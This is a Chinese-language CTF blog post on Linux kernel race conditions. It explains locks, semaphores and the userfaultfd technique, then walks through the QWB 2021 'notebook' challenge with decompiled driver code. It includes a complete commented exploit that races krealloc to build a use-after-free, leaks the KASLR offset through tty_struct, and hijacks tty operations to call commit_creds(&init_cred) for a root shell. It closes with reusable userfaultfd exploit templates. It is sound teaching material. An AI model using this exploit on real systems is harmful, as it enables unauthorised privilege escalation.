---
layout: post
title: 0x03. Linux kernel基础：条件竞争
category: kernel pwn
date: 2024-7-20 15:00:00
---
一位Web大师曾经告诉我：看似完全没有漏洞的题目就是在考条件竞争...
<!-- more -->

[toc]

# Linux kernel之条件竞争

在用户态下，若看到某个程序使用了多线程，那么我们往往会考虑该程序的利用方式是否是条件竞争。而在内核态下，用户可以非常便捷地编写多线程，因此内核驱动的锁若使用不当，或者根本没有加锁，那么就可以使用条件竞争来进行漏洞利用。

## 0x00. 基础知识

### 锁

学过《操作系统》的师傅可能并不会对锁感到陌生。锁能够防止多个进程同时使用某些资源，或者进入临界区。而若锁使用不当时，就会造成各种意料之外的结果，或是在`Linux kernel pwn`中受到条件竞争的攻击。

这里先列出各种锁和其使用范围：

| 锁类型                   | 允许的并发数（读操作） | 允许的并发数（写操作） |
| ------------------------ | ---------------------- | ---------------------- |
| 自旋锁 (Spinlock)        | 1                      | 1                      |
| 读写锁 (Read-Write Lock) | 多个（读锁）           | 1（写锁）              |
| 互斥锁 (Mutex)           | 1                      | 1                      |
| 信号量 (Semaphore)       | 可配置                 | 可配置                 |
| RCU (Read-Copy Update)   | 多个（读操作）         | 1（更新操作）          |
| 顺序锁 (Seqlock)         | 多个（可能需要重试）   | 1                      |

可以看到，只有互斥锁`mutex`以及自旋锁`spinlock`能够严格要求只能有一个进程进入临界区。而其它种类的锁若使用不当，则容易出现漏洞。例如，对于读写锁`read-write lock`，其中若使用写锁，则能够严格控制只有一个进程进入临界区，而若使用读锁，则能够有**多个进程进入临界区**，此时就容易出现漏洞。

### 多进程

通过`C`语言在用户态下编写多进程的代码是相对比较容易的，这里笔者向师傅复习一下`C`语言多进程的实现方式：

```c
#include <pthread.h>

// 我们主要通过pthread_create函数来创建多进程
int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine)(void *), void *arg);
```

其中：

- 第一个参数为指向线程标识符的指针，相当于`pid`。
- 第二个参数为指向线程属性对象的指针，例如线程的堆栈大小等，我们一般填`NULL`即可。
- 第三个参数为线程执行的函数。填函数名即可。
- 第四个参数为线程执行的参数。

因此，我们通过如下方式来创建多进程函数即可：

```c
#include <stdio.h>
#include <pthread.h>

// 注意这个函数是void*
void* hello(void* args) // 参数为void* args
{
    printf("Hello world from thread 2!\n");
}

int main()
{
    pthread_t new_thread;
    pthread_create(&new_thread, NULL, hello, NULL);
    printf("Hello world from main thread!\n");
    return 0;
}
```

### 信号量

信号量也是操作系统中经常提到的概念。而信号量我们能够用来做什么呢？用法其实多种多样。例如，我们可以使用信号量来控制多个线程的先后执行顺序——以便于我们进行条件竞争。

先来看信号量的使用方法。

定义信号量：

```c
#include <semaphore.h>

sem_t signal1, signal2;
```

初始化信号量：

```c
sem_init(&signal1, 0, 0);
sem_init(&signal2, 0, 0);
```

获取一个信号量，若没有则等待：

```c
sem_wait(&signal1);
```

释放一个信号量，使得信号量`+1`：

```c
sem_post(&signal1);
```

因此，我们通过一个多线程的例子，来理清信号量的使用方法：

```c
#include <semaphore.h>
#include <pthread.h>
#include <stdio.h>

// 定义两个信号量
sem_t signal_hello, signal_bye;
// 定义两个线程标识符
pthread_t thread_hello, thread_bye;

// 线程1：hello，输出hello, world
void* hello(void* args)
{
    // 获取到signal_hello才继续执行
    sem_wait(&signal_hello);
    printf("Hello, world!\n");
}

// 线程2：bye，输出bye bye
void* bye(void* args)
{
    // 获取到信号量signal_bye才继续执行
    sem_wait(&signal_bye);
    printf("bye bye!\n");
}

int main()
{
    // 使用信号量前，需要先进行初始化
    sem_init(&signal_hello, 0, 0);
    sem_init(&signal_bye, 0, 0);
    
    // 创建两个线程
    // 由于两个线程内部都有sem_wait，因此都不会立即输出
    pthread_create(&thread_hello, NULL, hello, NULL);
    pthread_create(&thread_bye, NULL, bye, NULL);
    
    // signal_hello信号量+1，因此立即输出helloworld
    sem_post(&signal_hello);
    
    sleep(1);
    
    // signal_bye信号量+1，因此立即输出bye bye
    sem_pose(&signal_bye);
    
    return 0;
}
```

## 0x01. double fetch

```tex
coming soon
```

## 0x02. userfaultfd系统调用（<5.11）

在`Linux`内核版本小于`5.11`时，`userfaultfd`系统调用都可以被普通用户使用。而之所以我们将`userfaultfd`写在条件竞争部分，当然是因为它可以在条件竞争时带来意外的一些好处....

### what is userfaultfd？

**该部分摘录于`arttnba3`师傅的博客：**

要使用 userfaultfd 系统调用，我们首先要注册一个 userfaultfd，通过 ioctl 监视一块内存区域，同时还需要专门启动一个用以进行轮询的线程 `uffd monitor`，该线程会通过 `poll()` 函数不断轮询**直到出现缺页异常**

- 当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 faulting 线程）进入到内核中处理缺页异常
- 内核会调用 `handle_userfault()` 交由 userfaultfd 处理
- 随后 faulting 线程进入堵塞状态，同时将一个 `uffd_msg` 发送给 monitor 线程，等待其处理结束
- monitor 线程调用通过 ioctl 处理缺页异常，有如下选项：
  - `UFFDIO_COPY`：将用户自定义数据拷贝到 faulting page 上
  - `UFFDIO_ZEROPAGE` ：将 faulting page 置0
  - `UFFDIO_WAKE`：用于配合上面两项中 `UFFDIO_COPY_MODE_DONTWAKE` 和 `UFFDIO_ZEROPAGE_MODE_DONTWAKE` 模式实现批量填充
- 在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作

以上便是 userfaultfd 这个机制的整个流程，该机制最初被设计来用以进行虚拟机/进程的迁移等用途，但是**通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高**

考虑在内核模块当中有一个菜单堆的情况，其中的操作都没有加锁，那么便存在条件竞争的可能，考虑如下竞争情况：

- 线程1不断地分配与编辑堆块
- 线程2不断地释放堆块

此时线程1便**有可能编辑到被释放的堆块**，若是此时恰好我们又将这个堆块申请到了合适的位置（比如说 tty_operations），那么我们便可以完成对该堆块的重写，从而进行下一步利用

但是毫无疑问的是，若是直接开两个线程进行竞争，命中的几率是比较低的，我们也很难判断是否命中

但假如线程1使用诸如 `copy_from_user` 、`copy_to_user` 等方法在用户空间与内核空间之间拷贝数据，那么我们便可以：

- 先用 mmap 分一块匿名内存，为其注册 userfaultfd，由于我们是使用 mmap 分配的匿名内存，此时该块内存并没有实际分配物理内存页
- 线程1在内核中在这块内存与内核对象间进行数据拷贝，**在访问注册了 userfaultfd 内存时便会触发缺页异常，陷入阻塞，控制权转交 userfaultfd 的 uffd monitor 线程**
- **在 uffd monitor 线程中我们便能对线程1正在操作的内核对象进行恶意操作**（例如覆写线程1正在读写的内核对象，或是将线程1正在读写的内核对象释放掉后再分配到我们想要的地方）
- 此时再让线程1继续执行，线程 1 便会**向我们想要写入的目标写入特定数据/从我们想要读取的目标读取特定数据**了

由此，我们便成功利用 userfaultfd 完成了对条件竞争漏洞的利用，这项技术的存在使得条件竞争的命中率大幅提高

### what is userfaultfd？（个人理解版）

上面`arttnba3`师傅提供了一个完整的`userfaultfd`的定义和用法。简单来说，就是我们在用户态对某个指针分配内存时，我们可以使用`mmap`将其分配为匿名内存。当访问到这块匿名内存时，若我们注册了`userfaultfd`并设置了处理函数，我们就可以让我们指定的处理函数来处理缺页的情况。

然而，我们可以让处理函数单纯`sleep`在那里，这样访问到匿名内存的线程就会直接卡住~因为它要等处理函数处理完毕才会继续执行。

因此，假设内核函数中有如下情景：

```c
kfree(ptr[index]);
copy_to_user(message, buf, 0x200);
ptr[index]=0;
```

若`massage`在用户态中被分配的是匿名内存并注册了`userfaultfd`，那么在运行到`copy_to_user`时便会先运行处理函数。而在处理函数中，我们编写为`sleep(1000000000000);`，即可让该线程几乎永久沉睡下去。而由于已经调用了`kfree`，却并没有运行到将指针清空的代码，因此就造成`UAF`了~

这就是`userfaultfd`在条件竞争部分的基础用法。

## 0x03. 初探userfaultfd：以强网杯2021-notebook为例

### 题目详情

题目给出了启动脚本如下：

```bash
qemu-system-x86_64 -m 64M \
        -kernel bzImage \
        -initrd rootfs.cpio \
        -append "loglevel=0 console=ttyS0 oops=panic panic=1 kaslr" \
        -nographic \
        -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap \
        -monitor /dev/null 2>/dev/null -s 
```

可以看到开启了如下机制/保护：

- 开启了`kaslr`，这意味着函数地址不再固定；
- 开启了`smep&smap`，这意味着内核态无法执行/访问用户态的数据和代码。

`rcS`如下：

```bash
#!/bin/sh
/bin/mount -t devtmpfs devtmpfs /dev
chown root:tty /dev/console
chown root:tty /dev/ptmx
chown root:tty /dev/tty
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts

mount -t proc proc /proc
mount -t sysfs sysfs /sys

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict

ifup eth0 > /dev/null 2>/dev/null

chown root:root /flag
chmod 600 /flag

insmod notebook.ko
cat /proc/modules | grep notebook > /tmp/moduleaddr
chmod 777 /tmp/moduleaddr
chmod 777 /dev/notebook
#poweroff -d 300 -f &
echo "Welcome to QWB!"

#sh
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys

poweroff -d 1 -n -f
```

可以看到：

- 设置`kptr_restrict`为`1`，这意味着普通用户无法直接查看`/proc/kallsyms`来获得函数地址；
- 设置`dmesg_restrict`为`1`，这意味着普通用户无法通过`dmseg`命令查看`printk`的输出。

题目注册了三个函数，包括`read`、`write`、以及`ioctl`。

`ioctl`是菜单堆（回来吧，我最骄傲的`glibc`）：

![QQ_1721700926186](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202407231015583.png)

有`add`、`edit`、`delete`、`gift`四个选项。

`note_add`代码如下：

```c
__int64 __fastcall noteadd(size_t idx, size_t size, void *buf)
{
  __int64 v3; // rdx
  __int64 v4; // r13
  note *v5; // rbx
  size_t v6; // r14
  __int64 v7; // rbx

  ((void (__fastcall *)(size_t, size_t, void *))_fentry__)(idx, size, buf);
  if ( idx > 0xF )
  {
    v7 = -1LL;
    printk("[x] Add idx out of range.\n");
  }
  else
  {
    v4 = v3;
    v5 = &notebook[idx];
    raw_read_lock(&lock);
    v6 = v5->size;
    v5->size = size;
    if ( size > 0x60 )
    {
      v5->size = v6;
      v7 = -2LL;
      printk("[x] Add size out of range.\n");
    }
    else
    {
      copy_from_user(name, v4, 0x100LL);
      if ( v5->note )
      {
        v5->size = v6;
        v7 = -3LL;
        printk("[x] Add idx is not empty.\n");
      }
      else
      {
        v5->note = (void *)_kmalloc(size, 0x24000C0LL);
        printk("[+] Add success. %s left a note.\n", name);
        v7 = 0LL;
      }
    }
    raw_read_unlock(&lock);
  }
  return v7;
}
```

注意到两个地方：

- 使用的锁为**读锁**，这意味着可以有**多个线程**同时进入临界区；
- 使用`copy_from_user`向全局变量指针`name`读取数据，而不是`kmalloc`申请的空间

而`kmalloc`的空间实际上是使用程序提供的`read`和`write`功能来进行读写的。

`note_edit`功能如下：

```c
__int64 __fastcall noteedit(size_t idx, size_t newsize, void *buf)
{
  __int64 v3; // rdx
  __int64 v4; // r13
  note *v5; // rbx
  size_t size; // rax
  __int64 v7; // r12
  __int64 v8; // rbx

  _fentry__(idx);
  if ( idx > 0xF )
  {
    v8 = -1LL;
    printk("[x] Edit idx out of range.\n", newsize);
    return v8;
  }
  v4 = v3;
  v5 = &notebook[idx];
  raw_read_lock(&lock);
  size = v5->size;
  v5->size = newsize;
  if ( size == newsize )
  {
    v8 = 1LL;
    goto editout;
  }
  v7 = ((__int64 (__fastcall *)(void *, size_t, __int64))&krealloc)(v5->note, newsize, 0x24000C0LL);
  copy_from_user(name, v4, 256LL);
  if ( !v5->size )
  {
    printk("free in fact");
    v5->note = 0LL;
    v8 = 0LL;
    goto editout;
  }
  if ( (unsigned __int8)_virt_addr_valid(v7) )
  {
    v5->note = (void *)v7;
    v8 = 2LL;
editout:
    raw_read_unlock(&lock);
    printk("[o] Edit success. %s edit a note.\n", name);
    return v8;
  }
  printk("[x] Return ptr unvalid.\n");
  raw_read_unlock(&lock);
  return 3LL;
}
```

注意到：

- 其中使用`krealloc`对`kmalloc`的指针进行空间的重分配。而当`size`为`0`时，其相当于`free`；
- 使用的仍然是**读锁**，意味着可以有**多个线程**同时进入临界区；

除此之外，`note_delete`函数为正常**释放并清空**堆块，且使用的为**写锁**，不存在条件竞争的可能。

### 解题思路总览

在`note_edit`函数中：

若`size`为`0`，这就满足了我们在`userfaultfd`中提到的：

```c
kfree(ptr[index]);
copy_from_user(name, v4, 0x200);
...
ptr[index] = 0;
```

说明这里是可以让我们用`userfaultfd`来进行条件竞争，并构造一个`UAF`。

除此之外，由于`add`函数中有`size`的`check`，因此我们还需要采用同样的方式进行`size`的还原。

### 解题方法：tty_struct(kmalloc-1k, GFP_KERNEL_ACCOUNT) + work_for_cpu_fn

由于存在`UAF`，且`UAF`的`size`是任意可控的，因此我们可以使用熟悉的`tty_struct`来进行利用。

而`tty_struct + work_for_cpu_fn`配合利用时，可以直接执行`commit_creds(&init_cred)`，因此可以直接提权而无需`rop`。因此，我们唯一需要思考的就是地址泄露的问题。由于本题目`kaslr`开启，因此我们对于函数地址是未知的。

幸运的是，`tty_struct`结构体也可以用于地址泄露。当申请到`tty_struct`结构体时，其`tty_operation`指针要么为`PTM_UNIX98_OPS`，要么为`PTY_UNIX98_OPS`。而即使开启了`kaslr`，十六进制低三位也是不变的。因此，我们利用`UAF`申请到`tty_struct`结构体时，可以查看其`tty_operations`指针的值，并判断其是属于`PTM_UNIX98_OPS`还是`PTY_UNIX98_OPS`。判断后，我们使用泄露出的该值减去其本来的值，即可得到内核的偏移。

顺便说下，我们在调试时可以先使用`root`用户调试并关闭`kaslr`，如此可以获得基地址和查看函数地址的权限。

那么，一个带详细注释的`exp`如下：

```c

#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <semaphore.h>
#include "ltfallkernel.h"

#define PTM_UNIX98_OPS 0xffffffff81e8e440
#define PTY_UNIX98_OPS 0xffffffff81e8e320
#define WORK_FOR_CPU_FN 0xffffffff8109eb90
#define COMMIT_CREDS 0xffffffff810a9b40
#define INIT_CRED 0xffffffff8225c940


size_t commit_creds = 0, prepare_kernel_cred = 0;

size_t user_cs, user_ss, user_rflags, user_sp;


typedef struct {
    size_t index;
    size_t size;
    void* buf;
}userarg;

int file_fd;

void note_add(size_t index, size_t size, char* buf){
    userarg book = {
        .index = index,
        .size = size,
        .buf = buf
    };
    ioctl(file_fd, 0x100, &book);
}

void note_delete(size_t index){
    userarg book = {
        .index = index
    };
    ioctl(file_fd, 0x200, &book);
}

void note_edit(size_t index, size_t size, char* buf){
    userarg book = {
        .index = index,
        .size = size,
        .buf = buf
    };
    ioctl(file_fd, 0x300, &book);
}

void gift(char* buf){
    userarg book = {
        .buf = buf
    };
    ioctl(file_fd, 0x64, &book);
    
}

void note_read(size_t index, char* buf){
    read(file_fd, buf, index);
}

void note_write(size_t index, char* buf){
    write(file_fd, buf, index);
}

char content[0x50];
char* uffd_addr;
sem_t evil_add, evil_edit;
pthread_t edit_thread, add_thread;
size_t kernel_offset = 0;


void make_UAF(){
    sem_wait(&evil_edit);
    note_edit(0, 0, uffd_addr); // UAF后卡住
}

void fix_size(){
    sem_wait(&evil_add);
    note_add(0, 0x60, uffd_addr);
}

int main(){
    pthread_t monitor;
    int tty_fd;
    size_t origin_tty_struct[0x100] = {0, };
    // size_t origin_tty_operations[0x100] = {0, };
    size_t tty_operation_value = 0;
    size_t fake_tty_operation[0x100] = {0, };
    size_t fake_tty_struct[0x100] = {0, };


    // 准备工作，千万注意要绑定cpu核心...
    info("Starting to exploit...");
    save_status();
    bind_core(0);

    // 打开题目驱动文件notebook
    file_fd = open("/dev/notebook", 2);
    if(file_fd < 0)
    {
        error("Cannot open dev notebook.");
        exit(0);
    }

    // 先创建一个正常的book，并realloc大小为0x2e0(tty_struct)
    note_add(0, 0x60, "helloltfall");
    note_edit(0, 0x2e0, "test");

    // 注册一个userfaultfd。这里是使用的板子，作用就是让访问到这块匿名内存的线程卡住
    uffd_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    register_userfaultfd_for_thread_stucking(&monitor, uffd_addr, 0x1000);

    // 初始化信号量。我们使用信号量来控制线程的先后顺序。
    sem_init(&evil_add, 0, 0);
    sem_init(&evil_edit, 0, 0);

    info("Making UAF...");

    // 创建两个线程，第一个来构造UAF，第二个来修改其size。
    // 由于这两个线程的函数内部都需要信号量，因此需要调用对应的sem_post才会开始执行
    pthread_create(&edit_thread, NULL, make_UAF, NULL);
    pthread_create(&add_thread, NULL, fix_size, NULL);

    // 控制make_UAF函数执行
    sem_post(&evil_edit);

    sleep(1);

    info("Fixing Size...");

    // 控制fix_size函数执行修复size
    sem_post(&evil_add);

    sleep(1);

    info("Alloc tty_struct...");
    
    // 打开tty_struct结构体，此时我们的chunk0即指向该结构体，由于UAF
    tty_fd = open("/dev/ptmx", O_RDWR| O_NOCTTY);
    if(tty_fd < 0){
        error("Failed to open /dev/ptmx.");
        exit(0);
    }

    // 读取该tty_struct结构体的值到origin_tty_struct备份，并读到fake_tty_struct来修改
    note_read(0, origin_tty_struct);
    note_read(0, fake_tty_struct);

    // 检查魔数是否为0x5401
    if(*(int*)origin_tty_struct != 0x5401){
        error("The magic value of tty is 0x%llx != 0x5401.", (size_t)*(int*)origin_tty_struct);
        exit(0);
    }

    success("Tty alloc done. Making UAF successed.");
    
    // 通过检查tty_operation的值来泄露内核偏移
    tty_operation_value = origin_tty_struct[3];
    if((tty_operation_value & 0xfff) == (PTM_UNIX98_OPS & 0xfff)){
        kernel_offset = tty_operation_value - PTM_UNIX98_OPS;
    }else if((tty_operation_value & 0xfff) == (PTY_UNIX98_OPS & 0xfff)){
        kernel_offset = tty_operation_value - PTY_UNIX98_OPS;
    }else{
        error("The magic value of tty_operation is 0x%llx, not ptm or pty.", tty_operation_value);
        exit(0);
    }

    success("The kernel offset is 0x%llx.", kernel_offset);

    // 设置tty_operation的ioctl函数为work_for_cpu_fn
    // 会导致执行ioctl时执行tty_struct[4](tty_struct[5])
    fake_tty_operation[12] = WORK_FOR_CPU_FN + kernel_offset;

    // 由于fake_tty_operations现在位于用户态，我们将其内容写到内核态才行(smap)
    note_add(1, 0x60, "ltfall_ltfall");
    note_edit(1, 0x2e0, "ltfall_ltfall");
    note_write(1, fake_tty_operation);

    // 通过gift读出note堆块地址，我们刚刚已经将fake_tty_operation写到堆块1上
    size_t note_addr[0x10] = {0, };
    gift(note_addr);

    // note_addr[2] 就是fake_tty_operation。
    fake_tty_struct[3] = note_addr[2];
    // 设置好work_for_cpu_fn函数的参数
    fake_tty_struct[4] = COMMIT_CREDS + kernel_offset;
    fake_tty_struct[5] = INIT_CRED + kernel_offset;
    
    // 将fake_tty_struct写回tty_struct
    info("Writing fake tty_struct to tty_struct...");
    note_write(0, fake_tty_struct);

    // 通过ioctl触发work_for_cpu_fn触发commit_creds(&init_cred);
    info("Triger work_for_cpu_fn by ioctl...");
    ioctl(tty_fd, 233, 233);

    // 已经执行了commit_creds(&init_cred);提权
    // 修复tty_struct防止u报错
    info("Repairing the tty_struct...");
    note_write(0, origin_tty_struct);
    
    // 用户态起一个shell，撒花~
    get_root_shell();
    return 0;
}
```

## 0x04. 板子一览

`API`请参考我在`Q & A`里面写的模板。

### 卡住线程

比较常用的实现，若只需要让某个`copy_from_user/copy_to_user`卡住，即可使用该方法实现。

使用方法如下：

```c
#include "ltfallkernel.h"

/* 全局变量，触发userfaultfd的地址 */
char* uffd_addr;

int main(){
    /* 定义monitor */
    pthread_t monitor; 
   	
    /* 注册userfaultfd */
    uffd_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1 , 0);
    register_userfaultfd_for_thread_stucking(&monitor, uffd_addr, 0x1000);
}
```

经过上面这段代码，即可使用`uffd_addr`来卡住任何访问这段内存的进程~

### 让其执行别的功能

在执行到`copy_from_user/copy_to_user`时，使其先执行别的功能~

也简单，我们需要先写好如下的`handler`函数：

```c
void *uffd_handler(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)args;

    for (;;)
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
        {
            err_exit("poll");
        }

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
        {
            err_exit("EOF on userfaultfd!\n");
        }

        if (nread == -1)
        {
            err_exit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT)
        {
            err_exit("Unexpected event on userfaultfd\n");
        }

        /* Write your code here */
        
        /* Ends here */
        
        /* set the return value of copy_from/to_user */
        page[0] = 0;
        /* Ends here */

        uffdio_copy.src = (unsigned long long)page;
        uffdio_copy.dst = (unsigned long long)msg.arg.pagefault.address &
                          ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        {
            err_exit("ioctl-UFFDIO_COPY");
        }

        return NULL;
    }
}
```

其中我们要让其处理的代码片段已经在代码中标出。

若需要使得`copy_to_user`或`copy_from_user`能够返回想要的值，则可在缺页中断处理中进行修改，即为其中的`page`。

随后使用如下板子：

```c
#include "ltfallkernel.h"

/* 全局变量，触发userfaultfd的地址 */
char* uffd_addr;
char* page;



int main(){
    /* 定义monitor */
    pthread_t monitor; 
   	
    /* 注册userfaultfd */
    uffd_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1 , 0);
    register_userfaultfd(&monitor, uffd_addr, 0x1000, (void*)uffd_handler);
    
    /* 为缺页处理的新页 */
    page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}
```

可以看到，使用的是`register_userfaultfd`函数，和卡住使用的`register_userfaultfd_for_thread_stucking`的区别仅仅是多了一个最后的`handler`参数，也就是具体处理内容。









